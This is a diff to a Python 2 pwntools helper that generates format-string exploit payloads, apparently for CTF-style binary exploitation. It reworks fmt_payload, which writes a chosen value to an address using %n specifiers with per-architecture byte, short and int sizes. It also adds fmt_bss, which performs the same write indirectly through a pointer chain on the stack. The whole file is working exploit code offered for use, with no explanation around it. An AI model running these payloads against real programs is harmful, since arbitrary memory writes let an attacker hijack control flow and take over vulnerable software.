@@ -1,5 +1,17 @@
 from pwn import *
 
+config = {
+    'i386' : {
+        'byte': (4, 1, 0xFF, 'hh', 8),
+        'short': (2, 2, 0xFFFF, 'h', 16),
+        'int': (1, 4, 0xFFFFFFFF, '', 32)},
+    'amd64' : {
+        'byte': (8, 1, 0xFF, 'hh', 8),
+        'short': (4, 2, 0xFFFF, 'h', 16),
+        'int': (2, 4, 0xFFFFFFFF, '', 32)
+    }
+}
+
 def fmt_payload(offset,address,value,n=0,written=0,arch='amd64',typex='byte'):
     '''
         offset is the deviation you found
@@ -10,17 +22,6 @@ def fmt_payload(offset,address,value,n=0,written=0,arch='amd64',typex='byte'):
         arch is the arch of the program , 32 or 64
         type is which way you want to use.
     '''
-    config = {
-        'i386' : {
-            'byte': (4, 1, 0xFF, 'hh', 8),
-            'short': (2, 2, 0xFFFF, 'h', 16),
-            'int': (1, 4, 0xFFFFFFFF, '', 32)},
-        'amd64' : {
-            'byte': (8, 1, 0xFF, 'hh', 8),
-            'short': (4, 2, 0xFFFF, 'h', 16),
-            'int': (2, 4, 0xFFFFFFFF, '', 32)
-        }
-    }
     assert(type(value)==int)
     if(value > int('F'*(2*config[arch]['byte'][0]),16)):
         print "Value is too large!"
@@ -55,9 +56,39 @@ def fmt_payload(offset,address,value,n=0,written=0,arch='amd64',typex='byte'):
         if arch == 'i386':
             payload.append(p32(i['address']))
     for i in range(n):
-        payload[i] = payload[i].format(soffset=soffset)
+        payload[i] = payload[i].format(soffset=str(soffset).rjust(2,'0'))
         soffset += 1
     return ''.join(payload)
 
+def fmt_bss(offset1,offset2,address,value,n=0,written=0,arch='amd64',typex='byte'):
+    '''
+    p3 is the target
+    p1:p2->p3
+    p2:p3
+    p4:0x1234
+    use p1 to change p2->p4
+    use p2 to change p4 to the value
+    '''
+    assert(type(value)==int)
+    if(value > int('F'*(2*config[arch]['byte'][0]),16)):
+        print "Value is too large!"
+        exit()
+    if n == 0:
+        n = config[arch][typex][0]
+    payload = []
+    tmp = "%{byte}c%{soffset}$"+config[arch][typex][3]+"n"
+    for i in range(n):
+        saddress = address + i*config[arch][typex][1]
+        byte1 = saddress&config[arch][typex][2]
+        tmp1 = tmp.format(byte=byte1,soffset=offset1)
+        payload.append(tmp1)
+        byte2 = value>>(i*config[arch][typex][4])&config[arch][typex][2]
+        tmp2 = tmp.format(byte=byte2,soffset=offset2)
+        payload.append(tmp2)
+    return payload
+
+    
+
+
 if __name__ == "__main__":
-    pass
+    print fmt_bss(10,18,0x4c,0x80485AB,arch='i386',n=2)
